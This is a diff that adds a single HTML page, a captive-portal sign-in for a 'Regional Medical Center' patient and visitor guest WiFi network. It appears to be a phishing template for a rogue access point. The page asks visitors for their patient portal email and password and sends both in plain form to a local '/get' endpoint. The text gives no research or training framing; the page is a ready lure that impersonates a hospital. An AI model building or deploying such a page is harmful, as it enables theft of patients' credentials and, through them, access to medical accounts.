@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Medical Center — Guest WiFi</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#f0f4f8;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.card{width:100%;max-width:420px;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 4px 30px rgba(0,60,120,0.08)}
+.top{background:#003087;padding:24px 28px 20px;display:flex;align-items:center;gap:16px}
+.cross-wrap{width:44px;height:44px;background:rgba(255,255,255,0.12);border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.cross-wrap svg{width:22px;height:22px;fill:#fff}
+.top-text .hosp{font-size:15px;font-weight:700;color:#fff}
+.top-text .dept{font-size:10.5px;color:rgba(255,255,255,0.6);margin-top:3px;letter-spacing:0.3px}
+.status-bar{background:#f8fafc;border-bottom:1px solid #e8eef5;padding:7px 28px;display:flex;align-items:center;gap:8px}
+.dot{width:6px;height:6px;background:#4ade80;border-radius:50%}
+.status-bar span{font-size:11px;color:#aaa}
+.status-bar strong{color:#003087;font-weight:600}
+.body{padding:24px 28px 20px}
+h2{font-size:16px;font-weight:700;color:#1a2a3a;margin-bottom:3px}
+.sub{font-size:12.5px;color:#aaa;margin-bottom:18px}
+.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:#aaa;margin-bottom:7px;margin-top:18px}
+input{width:100%;padding:11px 13px;border:1.5px solid #e0e8f0;border-radius:8px;font-size:14px;background:#f8fafc;color:#1a2a3a}
+input:focus{outline:none;border-color:#003087;box-shadow:0 0 0 3px rgba(0,48,135,0.07)}
+input::placeholder{color:#c8d4e0}
+.btn{width:100%;padding:12px;margin-top:20px;border:none;border-radius:8px;background:#003087;color:#fff;font-size:13px;font-weight:700;cursor:pointer}
+.terms{font-size:11px;color:#c0c8d0;text-align:center;margin-top:12px;line-height:1.6}
+.terms a{color:#003087}
+.notice{background:#f0f6ff;border:1px solid #d0e0f5;border-radius:6px;padding:10px 12px;margin-bottom:4px;font-size:11.5px;color:#4a6080;line-height:1.5}
+.foot{background:#f8fafc;border-top:1px solid #e8eef5;padding:11px 28px;display:flex;justify-content:space-between}
+.foot span,.foot a{font-size:10.5px;color:#c0c8d0;text-decoration:none}
+.foot a{color:#003087}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="top">
+    <div class="cross-wrap">
+      <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-6 16h-2v-5H6v-2h5V7h2v5h5v2h-5v5z"/></svg>
+    </div>
+    <div class="top-text">
+      <div class="hosp">Regional Medical Center</div>
+      <div class="dept">Patient &amp; Visitor Guest WiFi</div>
+    </div>
+  </div>
+  <div class="status-bar"><div class="dot"></div><span>Network: <strong>RMC-GuestWiFi</strong></span></div>
+  <div class="body">
+    <div class="notice">📶 This network is for patients and authorized visitors only. Please sign in with your patient portal account.</div>
+    <h2>Guest Network Access</h2>
+    <p class="sub">Sign in to access complimentary internet during your visit.</p>
+    <form action="/get">
+      <label class="lbl">Patient Portal Email</label>
+      <input name="email" type="text" placeholder="you@example.com" required>
+      <label class="lbl">Password</label>
+      <input name="password" type="password" placeholder="Enter your password" required>
+      <button type="submit" class="btn">Sign In &amp; Connect</button>
+      <p class="terms">By connecting you agree to our <a href="#">Network Use Policy</a>.</p>
+    </form>
+  </div>
+  <div class="foot"><span>&copy; Regional Medical Center</span><a href="#">IT Support</a></div>
+</div>
+</body>
+</html>
